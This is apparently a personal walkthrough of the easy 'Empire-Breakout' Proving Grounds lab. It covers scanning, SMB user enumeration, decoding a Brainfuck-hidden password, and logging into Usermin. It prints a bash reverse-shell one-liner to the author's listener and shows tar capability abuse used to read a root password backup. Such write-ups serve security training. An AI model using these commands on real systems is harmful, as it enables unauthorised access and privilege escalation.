### Empire-Breakout Proving Grounds

### Difficulty = Easy

### IP Address = 192.168.153.238

Nmap Scan:

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/EmpireBreakout]                                                                                                                                                              
└─$ nmap -sCV -A 192.168.153.238 -p80,139,445,10000,20000 -oN nmapscan                                                                                                                                             
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-25 20:56 WAT                                                                                                                                                    
Stats: 0:00:03 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan                                                                                                                                           
Ping Scan Timing: About 50.00% done; ETC: 20:56 (0:00:01 remaining)                                                                                                                                                
Stats: 0:00:05 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan                                                                                                                                           
Parallel DNS resolution of 1 host. Timing: About 0.00% done                                                                                                                                                        
Stats: 0:01:25 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan                                                                                                                                        
Service scan Timing: About 80.00% done; ETC: 20:58 (0:00:19 remaining)                                                                                                                                             
Nmap scan report for 192.168.153.238                                                                                                                                                                               
Host is up (0.46s latency).                                                                                                                                                                                        
                                                                                                                                                                                                                   
PORT      STATE SERVICE      VERSION                                                                                                                                                                               
80/tcp    open  http         Apache httpd 2.4.51 ((Debian))                                                                                                                                                        
|_http-server-header: Apache/2.4.51 (Debian)                                                                                                                                                                       
|_http-title: Apache2 Debian Default Page: It works                                                                                                                                                                
139/tcp   open  netbios-ssn?                                                                                                                                                                                       
445/tcp   open  netbios-ssn  Samba smbd 4.6.2                                                                                                                                                                      
10000/tcp open  http         MiniServ 1.981 (Webmin httpd)
|_http-title: 200 &mdash; Document follows
20000/tcp open  http         MiniServ 1.830 (Webmin httpd)
|_http-title: 200 &mdash; Document follows
|_http-server-header: MiniServ/1.830

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-01-25T19:59:17
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 200.55 seconds

```

Checking smb maybe we can list shares anonymously

But we can't

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/EmpireBreakout]
└─$ smbclient -L 192.168.153.238               
Password for [WORKGROUP\mark]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Samba 4.13.5-Debian)
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
protocol negotiation failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```

So what my eyes see is that there are three different web servers 

And i'll check out 10000 and 20000 

Since we know the web server running on those ports are webmin on ssl

I'll search for exploit for both `MiniServ 1.830 ` & `MiniServ 1.981 `

But after searching it seems all RCE exploits are authenticated too bad for us cause we don't have any valid cred yet

And trying default cred on both webmin interface doesn't work

So now lets go back and enumerate port 80 (http)

On navigating to the web server on port 80 

It shows the default apache page
![image](https://user-images.githubusercontent.com/113513376/214678014-5fd81a88-0e73-4499-a11f-8d3f55ed6817.png)

Checking the source code we see an encrypted stuff 

The encoding is likely `brainfuck`
![image](https://user-images.githubusercontent.com/113513376/214683161-cc81a1cb-198c-4818-a952-9b82505a5bf4.png)

```

<!--
don't worry no one will get here, it's safe to share with you my access. Its encrypted :)

++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>---------.<<++++++.++++++.


-->
```

Now i'll decrytped the encrypted string using [Decode](https://www.dcode.fr/langage-brainfuck)
![image](https://user-images.githubusercontent.com/113513376/214683986-3e55bdb4-201c-4172-b932-1c096f7df110.png)

So here's the decypted value 

```
Decrypted: .2uqPEfj3D<P'a-3
```

Now that we have cred lets try logging in the webmin 

But it doesn't work on port webmin interface
![image](https://user-images.githubusercontent.com/113513376/214684387-c7a514cc-8e03-406c-8092-9d7dac1782f2.png)
![image](https://user-images.githubusercontent.com/113513376/214684622-6d94fc28-821d-4946-b24d-d3bd618604c9.png)

So we have the password but not the user for the webmin interface

And from the nmapscan we know that smb is open

We can leverage that to enumerate users on the box which after we will then attempt to login again using the user's found

I'll be using `enum4linux` tool to perfrom the user enumeration

It takes some while though but eventually you get this

```
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\cyber (Local User)
```

So i'll using the username for the login in the webmin as `cyber`

After trying on port `20000` it works and we get logged in 
![image](https://user-images.githubusercontent.com/113513376/214690789-9457ed7b-8806-4194-9f6d-b94426133c31.png)

Trying on port `10000` doesn't work lol 

Now searching for exploit leads to this [Exploit](https://www.exploit-db.com/exploits/50234)

Lets see what is required

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/EmpireBreakout]
└─$ python3 exploit.py                                                  
usage: exploit.py [-h] -u HOST -l LOGIN -p PASSWORD
exploit.py: error: the following arguments are required: -u/--host, -l/--login, -p/--password
```

So just the host username & password

I'll check out the code and edit the ip for it to send the reverse shell
![image](https://user-images.githubusercontent.com/113513376/214692275-8b27edb2-b58c-4a90-aedc-e0685d43d071.png)

Now lets run the exploit with the required argument and i also have a netcat listener open on port 80

For some reason the exploit doesn't work i have no idea why

Anyways lets check out what usermin does

After playing around with it i learnt that its possible to execute commands on the remote server either maybe via cronjob or the minimal shell
![image](https://user-images.githubusercontent.com/113513376/214699372-a2cb7472-96a3-40e2-8db4-3b0d2770bebd.png)

So lets get a reverse shell then 

```
┌──(mark__haxor)-[~/Desktop/Tools]
└─$ ./shellgen.sh -t bash -i 192.168.45.5 -p 1337       
bash -i >& /dev/tcp/192.168.45.5/1337 0>&1

```

Now i'll put the payload on the server
![image](https://user-images.githubusercontent.com/113513376/214699927-59207b50-a26a-4b8d-b9db-e7bcf0fb815e.png)

```
┌──(mark__haxor)-[~/Desktop/Tools]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [192.168.45.5] from (UNKNOWN) [192.168.153.238] 48032
bash: cannot set terminal process group (3083): Inappropriate ioctl for device
bash: no job control in this shell
cyber@breakout:~$ 
```

Now time to stabilize the shell

```
python3 -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm
CTRL + Z
stty raw -echo;fg
reset
```

Now lets get root 

After enumeration i found this backup file

```
cyber@breakout:~/.spamassassin$ cd /var/backups/
cyber@breakout:/var/backups$ ls -al
total 484
drwxr-xr-x  2 root root   4096 Dec  8 06:25 .
drwxr-xr-x 14 root root   4096 Oct 19  2021 ..
-rw-r--r--  1 root root  40960 Dec  8 06:25 alternatives.tar.0
-rw-r--r--  1 root root  12674 Nov 17 03:45 apt.extended_states.0
-rw-r--r--  1 root root   1467 Oct 19  2021 apt.extended_states.1.gz
-rw-r--r--  1 root root      0 Dec  8 06:25 dpkg.arch.0
-rw-r--r--  1 root root    186 Oct 19  2021 dpkg.diversions.0
-rw-r--r--  1 root root    135 Oct 19  2021 dpkg.statoverride.0
-rw-r--r--  1 root root 413488 Oct 19  2021 dpkg.status.0
-rw-------  1 root root     17 Oct 20  2021 .old_pass.bak
```

But we don't have read access hehehe

So checking for capabilites shows that tar has capability set on it

```
cyber@breakout:/var/backups$ getcap -r / 2>/dev/null
/home/cyber/tar cap_dac_read_search=ep
/usr/bin/ping cap_net_raw=ep
cyber@breakout:/var/backups$
```

We can abuse this by reading any file in the system

Just like how `tar` works we are going to compress the backup file then untar it sweet right?

```
cyber@breakout:/var/backups$ /home/cyber/tar -cf /tmp/lol.tar .old_pass.bak
cyber@breakout:/var/backups$ ls /tmp
lol.tar
systemd-private-c5165a09fba74115b8bc97af191f09af-apache2.service-eVv84g
systemd-private-c5165a09fba74115b8bc97af191f09af-systemd-logind.service-CdTe8h
systemd-private-c5165a09fba74115b8bc97af191f09af-systemd-timesyncd.service-i3220e
vmware-root_358-591958305
cyber@breakout:/var/backups$ cd /tmp
cyber@breakout:/tmp$ tar -xf lol.tar 
cyber@breakout:/tmp$ ls -a
.
..
.font-unix
.ICE-unix
lol.tar
.old_pass.bak
systemd-private-c5165a09fba74115b8bc97af191f09af-apache2.service-eVv84g
systemd-private-c5165a09fba74115b8bc97af191f09af-systemd-logind.service-CdTe8h
systemd-private-c5165a09fba74115b8bc97af191f09af-systemd-timesyncd.service-i3220e
.Test-unix
vmware-root_358-591958305
.webmin
.X11-unix
.XIM-unix
cyber@breakout:/tmp$ mv .old_pass.bak pass.bak
cyber@breakout:/tmp$
```

Now we can read the file

```
cyber@breakout:/tmp$ cat pass.bak 
Ts&4&YurgtRX(=~h
cyber@breakout:/tmp$
```

Woah what a secured password 😅

Lets su to root using this password

```
cyber@breakout:/tmp$ su root
Password: 
root@breakout:/tmp# cd /root
root@breakout:~# ls -al
total 40
drwx------  6 root root 4096 Jan 25 14:55 .
drwxr-xr-x 18 root root 4096 Oct 19  2021 ..
-rw-------  1 root root 1010 Dec 14 10:19 .bash_history
-rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
drwxr-xr-x  3 root root 4096 Oct 19  2021 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r--r--  1 root root   33 Jan 25 14:55 proof.txt
drwx------  2 root root 4096 Oct 19  2021 .spamassassin
drwxr-xr-x  2 root root 4096 Jan 25 16:06 .tmp
drwx------  6 root root 4096 Oct 19  2021 .usermin
root@breakout:~# cat proof.txt 
3a134676deb7e0130d5616798bbbab7c
root@breakout:~#
```

And we're done 



<br> <br>
[Back To Home](../../index.md)
<br>
  












